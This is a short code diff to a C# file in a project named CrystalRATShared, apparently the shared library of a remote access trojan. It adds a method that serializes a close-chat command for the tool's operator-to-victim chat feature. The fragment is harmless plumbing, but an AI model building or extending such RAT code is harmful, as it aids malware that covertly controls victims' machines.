@@ -1,4 +1,5 @@
-﻿using CrystalRATShared.Serialization;
+﻿using CrystalRATShared.Commands;
+using CrystalRATShared.Serialization;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -9,6 +10,11 @@ namespace CrystalRATShared.Functions
 {
     public static class ChatMessage
     {
+
+        public static byte[] CloseRequest()
+        {
+            return CommandDataSerializer.Serialize(CommandFlags.CloseChat);
+        }
 
         public static byte[] Create(string text, string ID)
         {
